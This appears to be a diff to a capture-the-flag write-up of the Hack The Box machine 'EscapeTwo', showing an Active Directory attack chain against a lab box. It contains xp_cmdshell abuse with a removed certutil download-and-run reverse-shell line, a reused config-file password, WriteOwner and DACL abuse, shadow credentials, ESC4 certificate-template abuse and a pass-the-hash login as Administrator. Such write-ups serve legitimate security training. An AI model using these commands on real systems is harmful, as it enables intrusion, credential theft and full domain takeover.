@@ -17,6 +17,10 @@ type: "post"
 
 > We are provided credentials to start on this box for the following account: **Username:** rose **Password:** KxEPkKe6R8su.
 
+EscapeTwo is an assumed-breach Active Directory scenario. Using the initial credentials, we identify a file containing database access credentials. These are leveraged to enable and abuse `xp_cmdshell`, providing remote command execution and an initial foothold on the system.
+
+Post-exploitation enumeration reveals additional credentials stored within an application configuration file, allowing lateral movement to a second domain user. Utilizing BloodHound for privilege path analysis, we identified that this account possess the `WriteOwner` rights over a service account. By abusing this misconfiguration, we take over the service account which we use to exploit the ESC4 attack path, resulting in full administrative access.
+
 ## Scanning
 
 ```
@@ -177,12 +181,141 @@ xp_cmdshell REVERSE_SHELL_COMMAND
 
 ![mssql reverse shell](/images/HTB-EscapeTwo/mssql_revshell.png)
 
+On our listener we get a connection as `sql_svc`.
+
+
+![foothold](/images/HTB-EscapeTwo/foothold.png)
+
+This account does not have the user flag.
+
+### Shell as ryan
+
+We see a user `ryan` besides the `Administrator`.
+
+![users list](/images/HTB-EscapeTwo/users_list.png)
+
+In `C:\SQL2019\ExpressAdv_ENU` we find `sql-Configuration.INI` containing another password `WqSZAF6CysDQbGb3`.
+
+![sql config password](/images/HTB-EscapeTwo/sqlsvc_pwd.png)
+
+Using this password we are able to login as `ryan`.
 
 ```
-xp_cmdshell "cmd.exe /c certutil -urlcache -split -f http://10.10.14.146:8000/Invoke-PowerShellTcpOneLine.ps1 shell.ps1 && shell.ps1"
+evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
 ```
 
+![ryan login](/images/HTB-EscapeTwo/ryan_login.png)
+
+The user flag is in `C:\Users\ryan\Desktop`.
 
 ## Privilege Escalation
+
+Let's start enumerating with BloodHound.
+
+```
+bloodhound-python -c all -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc dc01.sequel.htb -ns 10.129.33.0
+```
+
+![bloodhound enumeration](/images/HTB-EscapeTwo/bloodhound.png)
+
+Launch BloodHound with 
+
+```
+sudo neo4j start
+bloodhound --no-sandbox
+```
+
+Ryan has the `WriteOwner` permission on `CA_SVC` which we can use to take over the account.
+
+![ryan WriteOwner](/images/HTB-EscapeTwo/ryan_WriteOwner.png)
+
+![WriteOwner help](/images/HTB-EscapeTwo/WriteOwner_help.png)
+
+Checking some information about the `ca_svc` account, we learn that it is part of the `Cert Publishers` group.
+
+![ca_svc account info](/images/HTB-EscapeTwo/ca_svc_group.png)
+
+We learn more information about this group on a Microsoft documentation page available [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups).
+
+![cert publishers group info](/images/HTB-EscapeTwo/cert_publishers_group.png)
+
+Our exploitation will have two main steps. First we need to gain control of `ca_svc` which we can do thanks to `WriteOwner` and the second step is abusing Active Directory Certificate Services (ADCS).
+
+1. Gain Ownership of the `ca_svc` Account.
+
+```
+bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
+```
+
+![bloodyAD](/images/HTB-EscapeTwo/bloodyAD.png)
+
+2. Grant `ryan` Full Control over `ca_svc`.
+
+> You can download `dacledit.py` [here](https://github.com/fortra/impacket/blob/master/examples/dacledit.py).
+
+```
+python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+```
+
+![dacledit](/images/HTB-EscapeTwo/dacledit.png)
+
+
+3. Exploit `ca_svc` Using ADCS Shadow Credentials.
+
+```
+certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip {ip} -ns {ip} -target dc01.sequel.htb -account ca_svc
+```
+
+![shadow credentials exploit](/images/HTB-EscapeTwo/certipy_shadow.png)
+
+
+4. Enumerate vulnerable certificate templates.
+
+```
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip {ip} -vulnerable -stdout
+```
+
+![certificate enumeration](/images/HTB-EscapeTwo/vulnerable_template.png)
+
+![template name](/images/HTB-EscapeTwo/Template_Name.png)
+
+![ESC4](/images/HTB-EscapeTwo/ESC4.png)
+
+5. Abuse the Vulnerable Certificate Template.
+
+```
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip {ip}
+```
+
+![Template Abuse](/images/HTB-EscapeTwo/Template_Abuse.png)
+
+6. Request a Certificate for the Administrator.
+
+```
+certipy-ad req -u ca_svc -hashes {ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
+```
+
+![certificate request](/images/HTB-EscapeTwo/certificate_request.png)
+
+7. Authenticate as Administrator Using the Certificate.
+
+```
+certipy-ad auth -pfx ./administrator.pfx -dc-ip {ip}
+```
+
+![Admin hash](/images/HTB-EscapeTwo/Admin_hash.png)
+
+8. Login as Administrator and read the root flag.
+
+```
+evil-winrm -i dc01.sequel.htb -u administrator -H {admin_hash}
+```
+
+![Admin login](/images/HTB-EscapeTwo/root_flag.png)
+
+Thank you for reading this write up! If you want to read more about the ESC4 attack and how to exploit it, check [this article](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/).
+
+
+
 
 
